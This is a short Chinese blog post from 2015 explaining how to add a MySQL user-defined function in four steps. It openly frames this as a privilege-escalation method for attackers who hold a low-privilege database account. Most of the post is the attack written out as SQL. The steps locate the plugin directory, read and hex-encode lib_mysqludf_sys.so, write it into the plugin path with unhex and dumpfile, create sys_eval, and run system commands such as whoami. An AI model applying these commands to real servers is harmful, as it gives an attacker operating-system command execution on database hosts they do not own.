---
author: ww
comments: true
date: 2015-11-28 07:55:16+00:00
layout: post
link: http://www.gl6.cc/blog/4%e6%ad%a5%e6%b7%bb%e5%8a%a0mysql-udf-%e5%87%bd%e6%95%b0.html
slug: 4%e6%ad%a5%e6%b7%bb%e5%8a%a0mysql-udf-%e5%87%bd%e6%95%b0
title: 4步添加mysql udf 函数
wordpress_id: 316
categories:
- database
- safe
- uncategorized
tags:
- mysql
- udf
---

## 通过udf函数执行系统命令


UDF（用户定义函数）是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。

只需要几步就可以通过执行sql语句来添加udf.
1. 获取plugin路径
`show variables like "%plugin%";`
`/usr/local/mysql/lib/mysql/plugin`

2. 获取udf的内容
`select hex(load_file('C:/lib_mysqludf_sys.so')) into outfile `'C:/udf.txt';

3.写入udf到plugin路径
`select unhex('7F454C46.....') into dumpfile '/usr/local/mysql/lib/mysql/plugin/mysqlsss.so';`

4.创建函数
`create function sys_eval returns string soname "mysqlsss.so";`

提示成功后可以使用自定义的函数了

    
    select sys_eval('whoami');
    
